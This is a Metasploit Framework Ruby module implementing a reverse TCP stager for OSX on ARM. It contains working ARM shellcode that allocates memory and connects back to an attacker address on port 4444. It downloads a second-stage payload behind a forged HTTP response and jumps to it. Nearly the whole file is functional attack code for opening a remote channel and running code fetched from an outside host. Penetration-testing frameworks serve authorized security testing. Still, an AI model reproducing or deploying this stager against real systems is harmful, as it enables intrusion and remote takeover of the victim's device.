##
# $Id: reverse_tcp.rb 5162 2007-10-20 02:08:42Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'

module Msf
module Payloads
module Stagers
module Osx
module Armle

###
#
# ReverseTcp
# ----------
#
# OSX reverse TCP stager.
#
###
module ReverseTcp

	include Msf::Payload::Stager

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse TCP Stager',
			'Version'       => '$Revision: 5162 $',
			'Description'   => 'Connect back to the attacker',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_ARMLE,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'MPORT' => [ 66, 'n'    ],
							'MHOST' => [ 68, 'ADDR' ],
						},
					'Payload' =>
					[
						# mmap
						0xe3a0c0c5, # mov r12, #0xc5
						0xe0200000, # eor r0, r0, r0
						0xe3a01502, # mov r1, #0x2, 10
						0xe3a02007, # mov r2, #0x7
						0xe3a03a01, # mov r3, #0x1, 20
						0xe3e04000, # mvn r4, #0x0
						0xe0255005, # eor r5, r5, r5
						0xef000080, # swi 128

						# store mmap address
						0xe1a0b000, # mov r11, r0

						# socket
						0xe3a00002, # mov r0, #0x2
						0xe3a01001, # mov r1, #0x1
						0xe3a02006, # mov r2, #0x6
						0xe3a0c061, # mov r12, #0x61
						0xef000080, # swi 128

						# store socket
						0xe1a0a000, # mov r10, r0
						0xeb000001, # bl _connect

						# port 4444
						0x5c110200,

						# host 192.168.0.135
						0x8700a8c0, 

						# connect
						0xe1a0000a, # mov r0, r10
						0xe1a0100e, # mov r1, lr
						0xe3a02010, # mov r2, #0x10
						0xe3a0c062, # mov r12, #0x62
						0xef000080, # swi 128
						0xe3500000, # cmp r0, #0x0
						0x1a000032, # bne _exit

						# get query length and data
						0xea000033, # b _query_data
						0xe28e8004, # add r8, lr, #0x4
						0xe49e9000, # ldr r9, [lr], #0

						# write query
						0xe3a0c004, # mov r12, #0x4
						0xe1a0000a, # mov r0, r10
						0xe1a01008, # mov r1, r8
						0xe1a02009, # mov r2, r9
						0xef000080, # swi 128
						0xe3500000, # cmp r0, #0x0
						0xba000028, # blt _exit
						0xe0888000, # add r8, r8, r0
						0xe0499000, # sub r9, r9, r0
						0xe3590000, # cmp r9, #0x0
						0x1afffff4, # bne _writemore

						# read until there's two \n's in a row
						0xe3a0c003, # mov r12, #0x3
						0xe1a0000a, # mov r0, r10
						0xe1a0100b, # mov r1, r11
						0xe3a02001, # mov r2, #0x1
						0xef000080, # swi 128
						0xe5db9000, # ldrb r9, [r11], #0
						0xe359000a, # cmp r9, '\n'
						0x1afffff7, # bne _readheaderbyte

						0xe3a0c003, # mov r12, #0x3
						0xe1a0000a, # mov r0, r10
						0xe1a0100b, # mov r1, r11
						0xe3a02001, # mov r2, #0x1
						0xef000080, # swi 128
						0xe5db9000, # ldrb r9, [r11], #0
						0xe359000d, # cmp r9, '\r'
						0x0afffff7, # beq _readlength

						0xe359000a, # cmp r9, '\n'
						0x1affffed, # bne _readheaderbyte

						# read length
						0xe3a0c003, # mov r12, #0x3
						0xe1a0000a, # mov r0, r10
						0xe1a0100b, # mov r1, r11
						0xe3a02004, # mov r2, #0x4
						0xef000080, # swi 128

						# setup download
						0xe49b9000, # ldr r9, [r11], #0
						0xe1a0800b, # mov r8, r11

						# download stage
						0xe3a0c003, # mov r12, #0x3
						0xe1a0000a, # mov r0, r10
						0xe1a01008, # mov r1, r8
						0xe1a02009, # mov r2, r9
						0xef000080, # swi 128
						0xe3500000, # cmp r0, #0x0
						0xba000004, # blt _exit
						0xe0888000, # add r8, r8, r0
						0xe0499000, # sub r9, r9, r0
						0xe3590000, # cmp r9, #0x0
						0x1afffff4, # bne _readmore

						# jump to stage
						0xe28bf000, # add pc, r11, #0x0

						# exit process
						0xe3a0c001, # mov r12, #0x1
						0xef000080, # swi 128

						# query data
						0xebffffca  # bl get_query_data

						# query length
						# query string

					].pack("V*")					

				}
			))
		register_options(
			[
				OptPath.new('QUERY', [ true, "Full path to the query to send" ])
			], self.class)
	end

	def generate
		payload = super
		
		begin
			print_status("Reading query file #{datastore['QUERY']}...")
			buff = ::IO.read(datastore['QUERY'])
			payload << [buff.length].pack("V")
			payload << buff
			print_status("Read #{buff.length} bytes...")
		rescue
			print_error("Failed to read query: #{$!}")
			return
		end
		
		if(payload.length > (1800))
			print_error("The payload must be less than 1800 bytes")
			return
		end

		return payload
	end

	def handle_intermediate_stage(conn, payload)
		print_status("Transmitting http header...")

		conn.put("HTTP/1.1 200 OK\r\nDate: Sun, 28 Oct 2007 01:18:58 GMT\r\nServer: Apache/1.3.33 (Unix)\r\nLast-Modified: Fri, 05 Oct 2007 05:19:42 GMT\r\nETag: 40000ec9-820-4705c96e\r\nAccept-Ranges: bytes\r\nContent-Length: ")
		conn.put((payload.length + 4).to_s)
		conn.put("\r\nConnection: close\r\nContent-Type: text/html\r\n\r\n")

		print_status("Transmitting stage length value...(#{payload.length} bytes)")

		address_format = 'V'
		
		# Transmit our intermediate stager
		conn.put( [ payload.length ].pack(address_format) )
    
		Rex::ThreadSafe.sleep(0.5)

		return true
	end	
	
end

end end end end end
